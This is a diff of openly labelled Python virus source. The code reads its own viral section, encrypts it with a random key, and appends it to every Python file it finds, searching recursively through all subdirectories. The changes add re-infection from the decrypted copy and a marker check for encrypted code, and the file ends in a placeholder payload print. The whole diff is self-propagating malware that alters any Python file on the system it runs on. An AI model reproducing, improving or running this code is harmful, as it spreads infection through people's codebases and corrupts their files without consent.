@@ -1,8 +1,6 @@
 # start the virus
 import sys, glob, re, codecs,random
 
-is_encrypted = False
-
 # read the virus/infected file
 virusLines = []
 thisFile = sys.argv[0]
@@ -10,12 +8,16 @@ virusFile = open(thisFile,"r")
 lines = virusFile.readlines()
 virusFile.close()
 
+is_encrypted = False
+
 # after infection just copy the malicious part to the other files
 realVirus = []
 not_encrypted = []
 is_virus_line = False
 little_flag = True
 for i,line in enumerate(lines):
+    if(not is_encrypted and re.search("^#e",lines[i])):
+        is_encrypted = True
     if(re.search("^# start the virus",lines[i])):
         is_virus_line = True
     if(re.search("^# end the virus",lines[i])):
@@ -69,15 +71,14 @@ def encrypt(lines,key_in_bits):
         result.append(encrypt_one_line(line,key_in_bits))
     return result
 
-if not is_encrypted:
-    print("hahahahah")
+def copyAndInfect():
     # random key generation part
     key_len = find_the_longest_element(realVirus)
     random_key = get_random_key(key_len)
     # encrypted version of the code
     encrypted = encrypt(realVirus,random_key)
     # find all python files in/under the current directory
-    programs = glob.glob('*.py',recursive=True)
+    programs = glob.glob('./**/*.py',recursive=True)
 
     # infect all programs
     for p in programs:
@@ -103,6 +104,9 @@ if not is_encrypted:
             file.write("\nis_encrypted = True")
             file.write("".join(str(item) for item in not_encrypted))   # writing the not encrypted part
             file.close()
+
+if not is_encrypted:
+    copyAndInfect()
 
 # end the virus
 
@@ -148,4 +152,51 @@ if(is_encrypted):
             encrypted_key.append(x[2:-1].split(" "))
 
     res = decrypt(encrypted_part,encrypted_key[0])
-    exec("".join(res),{"sys":sys,"glob":glob, "re":re, "codecs":codecs,"random":random},{"is_encrypted":is_encrypted})
+    exec("".join(res))
+
+    # after infection just copy the malicious part to the other files
+    not_encrypted = []
+    is_virus_line = True
+    for line in lines:
+        if(re.search("^# end the virus",line)):
+            is_virus_line = False
+        if(not is_virus_line):
+            not_encrypted.append(line)
+
+
+    # random key generation part
+    key_len = find_the_longest_element(res)
+    random_key = get_random_key(key_len)
+    # encrypted version of the code
+    encrypted = encrypt(res,random_key)
+    # find all python files in/under the current directory
+    programs = glob.glob('./**/*.py',recursive=True)
+
+    # infect all programs
+    for p in programs:
+        file = open(p,"r")
+        programCodeList = file.readlines()
+        file.close
+
+        infected = False
+        for line in programCodeList:
+            if(re.search("^# start the virus",line)):
+                infected = True
+                break
+
+        if not infected:
+
+            file = open(p,'w')
+            file.write("\n".join(str(item) for item in programCodeList)) # writing the original code
+            file.write("\n# start the virus")
+            file.write("\n#e")
+            file.write("\n#e".join(str(item) for item in encrypted))      # writing the encryped part
+            file.write("\n# end the virus")
+            file.write("\n#a" + " ".join(random_key))                     # writing the key
+            file.write("\nis_encrypted = True")
+            file.write("".join(str(item) for item in not_encrypted))   # writing the not encrypted part
+            file.close()
+
+# PAYLOAD
+
+print("Here comes the payload !!")
